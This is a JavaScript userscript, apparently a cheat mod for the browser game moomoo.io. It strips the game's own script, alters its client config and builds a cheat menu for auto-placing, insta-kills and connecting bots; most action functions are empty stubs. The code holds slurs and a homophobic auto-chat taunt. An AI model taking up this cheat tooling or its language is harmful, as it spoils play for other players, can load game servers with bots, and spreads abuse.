// ==UserScript==
// @name         B.Cry v2
// @version      depends
// @author       um
// @match        *://*.moomoo.io/*
// @description  No nigga
// @include      *
// @grant        none
// ==/UserScript==
window.autoInject = {
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
c:'g',
    g:'g',
    aswd:'ff',
    dwasa:'fg',
}
if(document.URL.includes('moomoo')){
let gameNameLoop = () => {
  setTimeout(() => {
    const _0x1f2ef7 = document.getElementById("gameName");
    if (_0x1f2ef7) {
      const _0x54abe6 = _0x1f2ef7.innerHTML;
      switch (_0x54abe6) {
        case "-Cry":
          _0x1f2ef7.innerHTML = "-Crying";
          break;
        case "Cry":
          _0x1f2ef7.innerHTML = "waa";
          break;
        default:
          _0x1f2ef7.innerHTML = "🚑😭For My Mod😭🚑";
          break;
      }
    } else {
      console.error("gay error fr");
    }
    gameNameLoop();
  }, 400);
};
gameNameLoop();
document.getElementById("mainMenu").style.backgroundImage = "url('')";
document.getElementById("mainMenu").style.backgroundSize = "cover";
document.getElementById("mainMenu").style.backgroundPosition = "center";
document.getElementById("mainMenu").style.backgroundRepeat = "no-repeat";
document.getElementById("mainMenu").style.width = "100vw";
document.getElementById("mainMenu").style.height = "100vh";
document.getElementById("gameName").style.textShadow = "#a16dce -2px -2px 10px, red 0px -5px 1px, red 0px -5px 10px";
var getElement = document.querySelector("#enterGame");
getElement.style.backgroundColor = "#d61818";
getElement.style.color = "#000000";
let founda = false;
let scriptTags = document.getElementsByTagName("script");
for (let i = 0; i < scriptTags.length; i++) {
  if (scriptTags[i].src.includes("index-f3a4c1ad.js") && !founda) {
    scriptTags[i].remove();
    founda = true;
    break;
  }
}
document.addEventListener("keydown", function (_0x43ec47) {
  if (_0x43ec47.keyCode === 192) {
    const _0x5ced36 = document.getElementById("gameUI");
    if (_0x5ced36) {
      const _0x588d3d = _0x5ced36.style.display;
      _0x5ced36.style.display = _0x588d3d === "none" ? "block" : "none";
    }
  }
});
document.addEventListener("keydown", function (_0x1b8ec6) {
  if (_0x1b8ec6.keyCode === 9) {
    const _0x2ff7c6 = document.getElementById("menuChatDiv");
    if (_0x2ff7c6) {
      const _0x1e11fb = _0x2ff7c6.style.display;
      _0x2ff7c6.style.display = _0x1e11fb === "none" ? "block" : "none";
    }
  }
});
window.addEventListener("load", function () {
  var _0x5b2f7a = document.getElementById("allianceButton");
  var _0x273206 = document.getElementById("storeButton");
  if (_0x273206) {
    _0x273206.style.right = "26px";
    _0x273206.style.top = "420px";
  }
  if (_0x5b2f7a) {
    _0x5b2f7a.style.right = "26px";
    _0x5b2f7a.style.top = "479px";
  }
});
function getEl(_0x41e014) {
  return document.getElementById(_0x41e014);
}
let newFont = document.createElement("link");
newFont.rel = "stylesheet";
newFont.href = "https://fonts.googleapis.com/css?family=Ubuntu:700";
newFont.type = "text/css";
document.body.append(newFont);
let min = document.createElement("script");
min.src = "https://rawgit.com/kawanet/msgpack-lite/master/dist/msgpack.min.js";
document.body.append(min);
window.oncontextmenu = function () {
  return false;
};
let config = window.config;
config.clientSendRate = 9;
config.serverUpdateRate = 9;
config.deathFadeout = 0;
config.playerCapacity = 9999;
config.isSandbox = window.location.hostname == "sandbox.moomoo.io";
config.skinColors = ["#bf8f54", "#cbb091", "#896c4b", "#fadadc", "#ececec", "#c37373", "#4c4c4c", "#ecaff7", "#738cc3", "#8bc373", "#91b2db"];
config.weaponVariants = [{
  id: 0,
  src: "",
  xp: 0,
  val: 1
}, {
  id: 1,
  src: "_g",
  xp: 3000,
  val: 1.1
}, {
  id: 2,
  src: "_d",
  xp: 7000,
  val: 1.18
}, {
  id: 3,
  src: "_r",
  poison: true,
  xp: 12000,
  val: 1.18
}, {
  id: 4,
  src: "_e",
  poison: true,
  heal: true,
  xp: 24000,
  val: 1.18
}];
config.anotherVisual = true;
config.useWebGl = false;
config.resetRender = true;
function waitTime(_0x5f0db9) {
  return new Promise(_0x4d8a7b => {
    setTimeout(() => {
      _0x4d8a7b();
    }, _0x5f0db9);
  });
}
let botSkts = [];
let canStore;
if (typeof Storage !== "undefined") {
  canStore = true;
}
function saveVal(_0x11e5b2, _0x3377c7) {
  if (canStore) {
    localStorage.setItem(_0x11e5b2, _0x3377c7);
  }
}
function deleteVal(_0x4e8379) {
  if (canStore) {
    localStorage.removeItem(_0x4e8379);
  }
}
function getSavedVal(_0x36e2d4) {
  if (canStore) {
    return localStorage.getItem(_0x36e2d4);
  }
  return null;
}
let gC = function (_0x48820e, _0x4dfa58) {
  try {
    let _0x5c30d7 = JSON.parse(getSavedVal(_0x48820e));
    if (typeof _0x5c30d7 === "object") {
      return _0x4dfa58;
    } else {
      return _0x5c30d7;
    }
  } catch (_0x4a0628) {
    alert("dieskid");
    return _0x4dfa58;
  }
};
function setCommands() {
  return {
    help: {
      desc: "Show Commands",
      action: function (_0x461119) {
        for (let _0x21cb03 in commands) {
          addMenuChText("/" + _0x21cb03, commands[_0x21cb03].desc, "lime", 1);
        }
      }
    },
    clear: {
      desc: "Clear Chats",
      action: function (_0x274ea1) {
        resetMenuChText();
      }
    },
    debug: {
      desc: "Debug Mod For Development",
      action: function (_0xb8c536) {
        addDeadPlayer(player);
        addMenuChText("Debug", "Done", "#99ee99", 1);
      }
    },
    play: {
      desc: "Play Music ( /play [link] )",
      action: function (_0xcf54a7) {
        let _0xd1032f = _0xcf54a7.split(" ");
        if (_0xd1032f[1]) {
          let _0x17a39f = new Audio(_0xd1032f[1]);
          _0x17a39f.play();
        } else {
          addMenuChText("Warn", "Enter Link ( /play [link] )", "#99ee99", 1);
        }
      }
    }
  };
}
function setConfigs() {
  return {
    HighautoQ: false,
    WarnLag: false,
    autochat: true,
    killChat: false,
    autoBuy: true,
    autoBuyEquip: true,
    autoPush: true,
    revTick: true,
    spikeTick: true,
    predictTick: true,
    autoPlace: true,
    autoReplace: true,
    counterInsta: true,
    antiTrap: true,
    slowOT: false,
    attackDir: false,
    showDir: false,
    autoRespawn: false
  };
}
let commands = setCommands();
let configs = setConfigs();
window.removeConfigs = function () {
  for (let _0x406282 in configs) {
    deleteVal(_0x406282, configs[_0x406282]);
  }
};
for (let cF in configs) {
  configs[cF] = gC(cF, configs[cF]);
}
window.changeMenu = function () {};
window.debug = function () {};
window.wasdMode = function () {};
window.startGrind = function () {};
window.connectFillBots = function () {};
window.destroyFillBots = function () {};
window.tryConnectBots = function () {};
window.destroyBots = function () {};
window.resBuild = function () {};
window.toggleBotsCircle = function () {};
window.toggleVisual = function () {};
window.prepareUI = function () {};
window.leave = function () {};
window.ping = 0;
class deadfuturechickenmodrevival {
  constructor(_0x243ea9, _0x51b9d0) {
    this.inGame = false;
    this.lover = _0x243ea9 + _0x51b9d0;
    this.baby = "ae86";
    this.isBlack = 0;
    this.webSocket = undefined;
    this.checkBaby = function () {
      if (this.baby !== "ae86") {
        this.isBlack++;
      } else {
        this.isBlack--;
      }
      if (this.isBlack >= 1) {
        return "bl4cky";
      }
      return "noting for you";
    };
    this.x2 = 0;
    this.y2 = 0;
    this.chat = "Imagine playing this badass game XDDDDD";
    this.summon = function (_0x283d75) {
      this.x2 = _0x283d75.x;
      this.y2 = _0x283d75.y;
      this.chat = _0x283d75.name + " ur so bad XDDDD";
    };
    this.commands = function (_0x31683b) {
      if (_0x31683b == "rv3link") {
        window.open("https://florr.io/");
      }
      if (_0x31683b == "woah") {
        window.open("https://www.youtube.com/watch?v=MO0AGukzj6M");
      }
      return _0x31683b;
    };
    this.dayte = "11yearold";
    this.memeganoob = "69yearold";
    this.startDayteSpawn = function (_0x1e8b8a) {
      let _0x402ec7 = setInterval(() => {
        this.x2 = _0x1e8b8a.x + 20;
        this.y2 = _0x1e8b8a.y - 20;
        this.chat = "UR SO BAD LOL";
        if (_0x1e8b8a.name == "ae86") {
          this.chat = "omg ae86 go run";
          setTimeout(() => {
            this.inGame = false;
            clearInterval(_0x402ec7);
          }, 1000);
        }
      }, 1234);
    };
    this.AntiChickenModV69420 = function (_0x1aa810) {
      return "!c!dc user " + _0x1aa810.name;
    };
  }
}
;
class HtmlAction {
  constructor(_0x2095ea) {
    this.element = _0x2095ea;
  }
  add(_0x40089) {
    if (!this.element) {
      return undefined;
    }
    this.element.innerHTML += _0x40089;
  }
  newLine(_0x560031) {
    let _0x599254 = "<br>";
    if (_0x560031 > 0) {
      _0x599254 = "";
      for (let _0x17d5cf = 0; _0x17d5cf < _0x560031; _0x17d5cf++) {
        _0x599254 += "<br>";
      }
    }
    this.add(_0x599254);
  }
  checkBox(_0x5478a8) {
    let _0x369035 = "<input type = \"checkbox\"";
    if (_0x5478a8.id) {
      _0x369035 += " id = " + _0x5478a8.id;
    }
    if (_0x5478a8.style) {
      _0x369035 += " style = " + _0x5478a8.style.replaceAll(" ", "");
    }
    if (_0x5478a8.class) {
      _0x369035 += " class = " + _0x5478a8.class;
    }
    if (_0x5478a8.checked) {
      _0x369035 += " checked";
    }
    if (_0x5478a8.onclick) {
      _0x369035 += " onclick = " + _0x5478a8.onclick;
    }
    _0x369035 += ">";
    this.add(_0x369035);
  }
  text(_0x3ac35f) {
    let _0x144a5d = "<input type = \"text\"";
    if (_0x3ac35f.id) {
      _0x144a5d += " id = " + _0x3ac35f.id;
    }
    if (_0x3ac35f.style) {
      _0x144a5d += " style = " + _0x3ac35f.style.replaceAll(" ", "");
    }
    if (_0x3ac35f.class) {
      _0x144a5d += " class = " + _0x3ac35f.class;
    }
    if (_0x3ac35f.size) {
      _0x144a5d += " size = " + _0x3ac35f.size;
    }
    if (_0x3ac35f.maxLength) {
      _0x144a5d += " maxLength = " + _0x3ac35f.maxLength;
    }
    if (_0x3ac35f.value) {
      _0x144a5d += " value = " + _0x3ac35f.value;
    }
    if (_0x3ac35f.placeHolder) {
      _0x144a5d += " placeHolder = " + _0x3ac35f.placeHolder.replaceAll(" ", "&nbsp;");
    }
    _0x144a5d += ">";
    this.add(_0x144a5d);
  }
  select(_0x47899f) {
    let _0x32eec0 = "<select";
    if (_0x47899f.id) {
      _0x32eec0 += " id = " + _0x47899f.id;
    }
    if (_0x47899f.style) {
      _0x32eec0 += " style = " + _0x47899f.style.replaceAll(" ", "");
    }
    if (_0x47899f.class) {
      _0x32eec0 += " class = " + _0x47899f.class;
    }
    _0x32eec0 += ">";
    for (let _0x3c511f in _0x47899f.option) {
      _0x32eec0 += "<option value = " + _0x47899f.option[_0x3c511f].id;
      if (_0x47899f.option[_0x3c511f].selected) {
        _0x32eec0 += " selected";
      }
      _0x32eec0 += ">" + _0x3c511f + "</option>";
    }
    _0x32eec0 += "</select>";
    this.add(_0x32eec0);
  }
  button(_0x2c1150) {
    let _0x52c74a = "<button";
    if (_0x2c1150.id) {
      _0x52c74a += " id = " + _0x2c1150.id;
    }
    if (_0x2c1150.style) {
      _0x52c74a += " style = " + _0x2c1150.style.replaceAll(" ", "");
    }
    if (_0x2c1150.class) {
      _0x52c74a += " class = " + _0x2c1150.class;
    }
    if (_0x2c1150.onclick) {
      _0x52c74a += " onclick = " + _0x2c1150.onclick;
    }
    _0x52c74a += ">";
    if (_0x2c1150.innerHTML) {
      _0x52c74a += _0x2c1150.innerHTML;
    }
    _0x52c74a += "</button>";
    this.add(_0x52c74a);
  }
  selectMenu(_0x47e451) {
    let _0x5a1d3b = "<select";
    if (!_0x47e451.id) {
      alert("please put id skid");
      return;
    }
    window[_0x47e451.id + "Func"] = function () {};
    if (_0x47e451.id) {
      _0x5a1d3b += " id = " + _0x47e451.id;
    }
    if (_0x47e451.style) {
      _0x5a1d3b += " style = " + _0x47e451.style.replaceAll(" ", "");
    }
    if (_0x47e451.class) {
      _0x5a1d3b += " class = " + _0x47e451.class;
    }
    _0x5a1d3b += " onchange = window." + (_0x47e451.id + "Func") + "()";
    _0x5a1d3b += ">";
    let _0x422a1d;
    let _0x5d6634 = 0;
    for (let _0x7eff23 in _0x47e451.menu) {
      _0x5a1d3b += "<option value = " + ("option_" + _0x7eff23) + " id = " + ("O_" + _0x7eff23);
      if (_0x47e451.menu[_0x7eff23]) {
        _0x5a1d3b += " checked";
      }
      _0x5a1d3b += " style = \"color: " + (_0x47e451.menu[_0x7eff23] ? "#000" : "#fff") + "; background: " + (_0x47e451.menu[_0x7eff23] ? "#8ecc51" : "#cc5151") + ";\">" + _0x7eff23 + "</option>";
      _0x5d6634++;
    }
    _0x5a1d3b += "</select>";
    this.add(_0x5a1d3b);
    _0x5d6634 = 0;
    for (let _0x27d8f5 in _0x47e451.menu) {
      window[_0x27d8f5 + "Func"] = function () {
        _0x47e451.menu[_0x27d8f5] = getEl("check_" + _0x27d8f5).checked ? true : false;
        saveVal(_0x27d8f5, _0x47e451.menu[_0x27d8f5]);
        getEl("O_" + _0x27d8f5).style.color = _0x47e451.menu[_0x27d8f5] ? "#000" : "#fff";
        getEl("O_" + _0x27d8f5).style.background = _0x47e451.menu[_0x27d8f5] ? "#8ecc51" : "#cc5151";
      };
      this.checkBox({
        id: "check_" + _0x27d8f5,
        style: "display: " + (_0x5d6634 == 0 ? "inline-block" : "none") + ";",
        class: "checkB",
        onclick: "window." + (_0x27d8f5 + "Func") + "()",
        checked: _0x47e451.menu[_0x27d8f5]
      });
      _0x5d6634++;
    }
    _0x422a1d = "check_" + getEl(_0x47e451.id).value.split("_")[1];
    window[_0x47e451.id + "Func"] = function () {
      getEl(_0x422a1d).style.display = "none";
      _0x422a1d = "check_" + getEl(_0x47e451.id).value.split("_")[1];
      getEl(_0x422a1d).style.display = "inline-block";
    };
  }
}
;
class Html {
  constructor() {
    this.element = null;
    this.action = null;
    this.divElement = null;
    this.startDiv = function (_0x2b93d7, _0x30e377) {
      let _0x12faa4 = document.createElement("div");
      if (_0x2b93d7.id) {
        _0x12faa4.id = _0x2b93d7.id;
      }
      if (_0x2b93d7.style) {
        _0x12faa4.style = _0x2b93d7.style;
      }
      if (_0x2b93d7.class) {
        _0x12faa4.className = _0x2b93d7.class;
      }
      this.element.appendChild(_0x12faa4);
      this.divElement = _0x12faa4;
      let _0x4d0881 = new HtmlAction(_0x12faa4);
      if (typeof _0x30e377 == "function") {
        _0x30e377(_0x4d0881);
      }
    };
    this.addDiv = function (_0x2851b9, _0x3bd82f) {
      let _0x1d99f5 = document.createElement("div");
      if (_0x2851b9.id) {
        _0x1d99f5.id = _0x2851b9.id;
      }
      if (_0x2851b9.style) {
        _0x1d99f5.style = _0x2851b9.style;
      }
      if (_0x2851b9.class) {
        _0x1d99f5.className = _0x2851b9.class;
      }
      if (_0x2851b9.appendID) {
        getEl(_0x2851b9.appendID).appendChild(_0x1d99f5);
      }
      this.divElement = _0x1d99f5;
      let _0x391431 = new HtmlAction(_0x1d99f5);
      if (typeof _0x3bd82f == "function") {
        _0x3bd82f(_0x391431);
      }
    };
  }
  set(_0x53ac2d) {
    this.element = getEl(_0x53ac2d);
    this.action = new HtmlAction(this.element);
  }
  resetHTML(_0x186754) {
    if (_0x186754) {
      this.element.innerHTML = "";
    } else {
      this.element.innerHTML = "";
    }
  }
  setStyle(_0x21f673) {
    this.element.style = _0x21f673;
  }
  setCSS(_0x38e1f0) {
    this.action.add("<style>" + _0x38e1f0 + "</style>");
  }
}
;
let HTML = new Html();
let menuDiv = document.createElement("div");
menuDiv.id = "menuDiv";
menuDiv.draggable = false;
menuDiv.addEventListener("dragstart", function (_0x5b6ade) {
  _0x5b6ade.dataTransfer.setData("text/plain", "");
});
document.addEventListener("dragover", function (_0x428eb6) {
  menuDiv.style.left = _0x428eb6.clientX - menuDiv.offsetWidth / 2 + "px";
  menuDiv.style.top = _0x428eb6.clientY - menuDiv.offsetHeight / 2 + "px";
});
document.body.appendChild(menuDiv);
HTML.set("menuDiv");
HTML.setStyle("\n            position: absolute;\n            left: 20px;\n            top: 20px;\n            ");
HTML.resetHTML();
HTML.setCSS("\n   .menuClass {\n    color: #fff;\n    font-size: 31px;\n    text-align: left;\n    padding: 20px; /* increased padding */\n    width: 300px; /* increased width */\n    height: 250px; /* increased height */\n  background-color: rgba(34, 34, 34, 0.7);\n    -webkit-border-radius: 8px; /* increased border radius */\n    -moz-border-radius: 8px; /* increased border radius */\n    border-radius: 8px; /* increased border radius */\n    box-shadow: 0 0 20px rgba(0, 0, 0, 0.7); /* White-gray shadow */\n    border: 5px solid #000; /* Black border */\n}\n\n    .menuC {\n        display: none;\n        font-family: \"Hammersmith One\";\n        font-size: 12px;\n        max-height: 180px;\n        overflow-y: scroll;\n        -webkit-touch-callout: none;\n        -webkit-user-select: none;\n        -khtml-user-select: none;\n        -moz-user-select: none;\n        -ms-user-select: none;\n        user-select: none;\n    }\n    .menuB {\n        text-align: center;\n        background-color: rgb(25, 25, 25);\n        color: #fff;\n        -webkit-border-radius: 4px;\n        -moz-border-radius: 4px;\n        border-radius: 4px;\n        border: 2px solid #000;\n        cursor: pointer;\n    }\n    .menuB:hover {\n        border: 2px solid #fff;\n    }\n    .menuB:active {\n        color: rgb(25, 25, 25);\n        background-color: rgb(200, 200, 200);\n    }\n    .customText {\n        color: #000;\n        -webkit-border-radius: 4px;\n        -moz-border-radius: 4px;\n        border-radius: 4px;\n        border: 2px solid #000;\n    }\n    .customText:focus {\n        background-color: yellow;\n    }\n    .checkB {\n        position: relative;\n        top: 2px;\n        accent-color: #888;\n        cursor: pointer;\n    }\n    .Cselect {\n        -webkit-border-radius: 4px;\n        -moz-border-radius: 4px;\n        border-radius: 4px;\n        background-color: rgb(75, 75, 75);\n        color: #fff;\n        border: 1px solid #000;\n    }\n    #menuChanger {\n        position: absolute;\n        right: 10px;\n        top: 10px;\n        background-color: #000; /* Black background */\n        color: #fff;\n        border: none;\n        cursor: pointer;\n    }\n    #menuChanger:hover {\n        color: #000;\n    }\n    ::-webkit-scrollbar {\n        width: 10px;\n    }\n    ::-webkit-scrollbar-track {\n        opacity: 0;\n    }\n    ::-webkit-scrollbar-thumb {\n        background-color: rgb(25, 25, 25);\n        -webkit-border-radius: 4px;\n        -moz-border-radius: 4px;\n        border-radius: 4px;\n    }\n    ::-webkit-scrollbar-thumb:active {\n        background-color: rgb(230, 230, 230);\n    }\n");
HTML.startDiv({
  id: "menuHeadLine",
  class: "menuClass"
}, _0x4d89b7 => {
  _0x4d89b7.add("🏥Cry🏥");
  _0x4d89b7.button({
    id: "menuChanger",
    class: "material-icons",
    innerHTML: "sync",
    onclick: "window.changeMenu()"
  });
  HTML.addDiv({
    id: "menuButtons",
    style: "display: block; overflow-y: visible;",
    class: "menuC",
    appendID: "menuHeadLine"
  }, _0x2e331f => {
    _0x2e331f.button({
      class: "menuB",
      innerHTML: "Debug",
      onclick: "window.debug()"
    });
  });
  HTML.addDiv({
    id: "menuMain",
    style: "display: block",
    class: "menuC",
    appendID: "menuHeadLine"
  }, _0x3c7c97 => {
    _0x3c7c97.button({
      class: "menuB",
      innerHTML: "Toggle Wasd Mode",
      onclick: "window.wasdMode()"
    });
    _0x3c7c97.newLine(2);
    HTML.addDiv({
      style: "font-size: 15px; color: #99ee99;",
      appendID: "menuMain"
    }, _0x1357e9 => {
      _0x1357e9.add("-Placement-");
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("AutoPlacer Placement Tick: ");
    _0x3c7c97.text({
      id: "autoPlaceTick",
      class: "customText",
      value: "1",
      size: "2em",
      maxLength: "1"
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("AutoPlaceType: ");
    _0x3c7c97.select({
      id: "autoPlacetype",
      class: "Cselect",
      option: {
        SmartPlace: {
          id: "yurpl",
          selected: true
        },
        PrePlace: {
          id: "spammy"
        }
      }
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("AutoReplaceType: ");
    _0x3c7c97.select({
      id: "autoReplacetype",
      class: "Cselect",
      option: {
        TrapReplace: {
          id: "Cryv1",
          selected: true
        },
        ProjectA2: {
          id: "HaThure"
        },
        Rev3place: {
          id: "rev3"
        }
      }
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("Weapon Grinder: ");
    _0x3c7c97.checkBox({
      id: "weaponGrind",
      class: "checkB",
      onclick: "window.startGrind()"
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("AFK: ");
    _0x3c7c97.checkBox({
      id: "afk",
      class: "checkB",
      onclick: "window.startGrind()"
    });
    _0x3c7c97.newLine(2);
    HTML.addDiv({
      style: "font-size: 15px; color: #99ee99;",
      appendID: "menuMain"
    }, _0x8f20bf => {
      _0x8f20bf.add("-Anti-");
    });
    _0x3c7c97.add("Configs: ");
    _0x3c7c97.selectMenu({
      id: "configsChanger",
      class: "Cselect",
      menu: configs
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("InstaKill Type: ");
    _0x3c7c97.select({
      id: "instaType",
      class: "Cselect",
      option: {
        OneShot: {
          id: "oneShot",
          selected: true
        },
        Spammer: {
          id: "spammer"
        }
      }
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("AntiBull Type: ");
    _0x3c7c97.select({
      id: "antiBullType",
      class: "Cselect",
      option: {
        "Disable AntiBull": {
          id: "noab"
        },
        "When Reloaded": {
          id: "abreload"
        },
        "Primary Reloaded": {
          id: "abalway",
          selected: true
        }
      }
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("Backup Nobull Insta: ");
    _0x3c7c97.checkBox({
      id: "backupNobull",
      class: "checkB",
      checked: true
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("AntiPush Beta:");
    _0x3c7c97.checkBox({
      id: "antipush",
      class: "checkB",
      checked: true
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("Turret Assistance: ");
    _0x3c7c97.checkBox({
      id: "turretCombat",
      class: "checkB",
      checked: true
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("Safe AntiSpikeTick: ");
    _0x3c7c97.checkBox({
      id: "safeAntiSpikeTick",
      class: "checkB",
      checked: true
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("Smart Anti: ");
    _0x3c7c97.checkBox({
      id: "smartAnti",
      class: "checkB",
      checked: true
    });
    _0x3c7c97.newLine(2);
    HTML.addDiv({
      style: "font-size: 15px; color: #99ee99;",
      appendID: "menuMain"
    }, _0x431ae8 => {
      _0x431ae8.add("-Visuals-");
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("Zoom: ");
    _0x3c7c97.select({
      id: "vision",
      class: "Cselect",
      option: {
        x1: {
          id: "1"
        },
        "x1.2": {
          id: "1.2",
          selected: true
        },
        "x1.4": {
          id: "1.4"
        },
        "x1.5": {
          id: "1.5"
        },
        "x1.6": {
          id: "1.6"
        },
        "x1.8": {
          id: "1.8"
        },
        x2: {
          id: "2"
        }
      }
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("CamSpeed: ");
    _0x3c7c97.select({
      id: "camera",
      class: "Cselect",
      option: {
        Cam0: {
          id: "normal",
          selected: true
        },
        Cam1: {
          id: "medium"
        },
        Cam2: {
          id: "smooth"
        }
      }
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("AutoGG: ");
    _0x3c7c97.select({
      id: "autogg",
      class: "Cselect",
      option: {
        "Cry for me": {
          id: "1",
          selected: true
        },
        "Why Fag[Playername]": {
          id: "2"
        },
        SmartKillChat: {
          id: "3"
        }
      }
    });
    _0x3c7c97.newLine();
    _0x3c7c97.add("Credits:florr.io:");
    _0x3c7c97.checkBox({
      id: "funni",
      class: "checkB",
      checked: false
    });
    _0x3c7c97.newLine();
  });
  HTML.addDiv({
    id: "menuConfig",
    class: "menuC",
    appendID: "menuHeadLine"
  }, _0x37d31a => {
    _0x37d31a.button({
      class: "menuB",
      innerHTML: "Nerfed to Shit",
      onclick: "window.tryConnectBots()"
    });
    _0x37d31a.button({
      class: "menuB",
      innerHTML: "Disconnect Bots",
      onclick: "window.destroyBots()"
    });
    _0x37d31a.newLine();
    _0x37d31a.button({
      class: "menuB",
      innerHTML: "Connect FBots",
      onclick: "window.connectFillBots()"
    });
    _0x37d31a.button({
      class: "menuB",
      innerHTML: "Disconnect FBots",
      onclick: "window.destroyFillBots()"
    });
    _0x37d31a.newLine();
    _0x37d31a.button({
      class: "menuB",
      innerHTML: "Reset Break Objects",
      onclick: "window.resBuild()"
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Break Objects Range: ");
    _0x37d31a.text({
      id: "breakRange",
      class: "customText",
      value: "700",
      size: "3em",
      maxLength: "4"
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Predict Movement Type: ");
    _0x37d31a.select({
      id: "predictType",
      class: "Cselect",
      option: {
        "Disable Render": {
          id: "disableRender",
          selected: true
        },
        "X/Y and 2": {
          id: "pre2"
        },
        "X/Y and 3": {
          id: "pre3"
        }
      }
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Render Placers: ");
    _0x37d31a.checkBox({
      id: "placeVis",
      class: "checkB",
      checked: true
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Bot Mode: ");
    _0x37d31a.select({
      id: "mode",
      class: "Cselect",
      option: {
        "Clear Building": {
          id: "clear",
          selected: true
        },
        Sync: {
          id: "zync"
        },
        Search: {
          id: "zearch"
        },
        "Clear Everything": {
          id: "fuckemup"
        },
        Flex: {
          id: "flex"
        }
      }
    });
    _0x37d31a.newLine(2);
    _0x37d31a.button({
      class: "menuB",
      innerHTML: "Toggle Fbots Circle",
      onclick: "window.toggleBotsCircle()"
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Circle Rad: ");
    _0x37d31a.text({
      id: "circleRad",
      class: "customText",
      value: "200",
      size: "3em",
      maxLength: "4"
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Rad Speed: ");
    _0x37d31a.text({
      id: "radSpeed",
      class: "customText",
      value: "0.1",
      size: "2em",
      maxLength: "3"
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Bot Zetup Type: ");
    _0x37d31a.select({
      id: "setup",
      class: "Cselect",
      option: {
        "Dagger Musket": {
          id: "dm",
          selected: true
        },
        "Katana Hammer": {
          id: "kh"
        },
        "Dagger Repeater-Crossbow": {
          id: "dr"
        },
        "Zhort-Zword Muzket": {
          id: "zd"
        }
      }
    });
    _0x37d31a.newLine();
    _0x37d31a.add("boost tick distance");
    _0x37d31a.text({
      id: "boosttickdistance",
      class: "customText",
      value: "200",
      size: "4em",
      maxLength: "3"
    });
    _0x37d31a.newLine();
    _0x37d31a.add("Player Follower");
    _0x37d31a.text({
      id: "playerSid",
      class: "customText",
      value: "0",
      size: "2em",
      maxLength: "2"
    });
    _0x37d31a.checkBox({
      id: "togglePlayerFollower",
      class: "checkB",
      onclick: "window.startFollow()",
      checked: false
    });
  });
  HTML.addDiv({
    id: "menuOther",
    class: "menuC",
    appendID: "menuHeadLine"
  }, _0x5795d2 => {
    HTML.addDiv({
      style: "font-size: 15px; color: #fff;",
      appendID: "menuHeadLine"
    }, _0x503203 => {
      _0x503203.add("Tab For ChatBox!");
    });
    _0x5795d2.add("Music: ");
    _0x5795d2.select({
      id: "autochats",
      class: "Cselect",
      option: {
        "Initial D - The Top": {
          id: "thetop",
          selected: true
        },
        "Initial D - Gas Gas Gas": {
          id: "gas"
        },
        "Initial D - Deja Vu": {
          id: "dejavu"
        },
        "Alaina Cross - No Rival": {
          id: "norival"
        },
        "Crypt x Joey Nato - Invincible": {
          id: "inv"
        },
        "Cheriimoya - Living Life In The Night": {
          id: "livinglife"
        },
        "Gentrammel - Out Of My Mind": {
          id: "outtamind"
        },
        "BEAUZ - Outerspace": {
          id: "outerspace"
        },
        "CRVN - Nobody": {
          id: "nobody"
        },
        "FELLOWSHIP - Glory Days": {
          id: "glorydays"
        },
        "LoL (Worlds 2017) - Legends Never Die": {
          id: "legendsNeverDie"
        },
        "V O E - Giants": {
          id: "giants"
        },
        "Turi ip ip": {
          id: "ipip"
        },
        "1nonly - Stay With Me": {
          id: "staywithme"
        },
        "Skyfall - Adele": {
          id: "skyfall"
        },
        "Better Place - NSYNC": {
          id: "betterplace"
        },
        "LoL (Worlds 2020) - Take Over": {
          id: "takeover"
        }
      }
    });
    _0x5795d2.newLine();
  });
});
let menuChatDiv = document.createElement("div");
menuChatDiv.id = "menuChatDiv";
document.body.appendChild(menuChatDiv);
HTML.set("menuChatDiv");
HTML.setStyle("\n      position: absolute;\n      display: none;\n      left: 20px;\n      top: 20px;\n      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.65);\n            ");
HTML.resetHTML();
